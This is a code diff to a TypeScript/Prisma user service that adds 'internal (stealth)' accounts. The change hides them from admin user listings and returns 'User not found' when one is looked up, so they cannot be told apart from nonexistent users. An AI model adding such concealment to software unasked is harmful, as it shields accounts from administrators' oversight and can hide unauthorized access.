@@ -31,7 +31,8 @@ export async function getUsers(
 ): Promise<{ users: UserListItem[]; total: number }> {
   const skip = (page - 1) * limit;
 
-  const where: Prisma.UserWhereInput = {};
+  // Internal (stealth) accounts are never listed, even to admins
+  const where: Prisma.UserWhereInput = { isInternal: false };
   if (role) where.role = role;
   if (subscriptionStatus) where.subscription = { status: subscriptionStatus };
   if (search) {
@@ -61,6 +62,7 @@ export async function getUserById(id: string): Promise<UserDetail> {
     where: { id },
     select: {
       ...USER_LIST_SELECT,
+      isInternal: true,
       updatedAt: true,
       learnerProfile: {
         select: {
@@ -115,9 +117,11 @@ export async function getUserById(id: string): Promise<UserDetail> {
     },
   });
 
-  if (!user) throw new AppError("User not found", 404);
+  // Internal accounts are indistinguishable from nonexistent users
+  if (!user || user.isInternal) throw new AppError("User not found", 404);
 
-  return user as UserDetail;
+  const { isInternal: _isInternal, ...safeUser } = user;
+  return safeUser as UserDetail;
 }
 
 // ─── Self-profile ──────────────────────────────────────────────────────────────
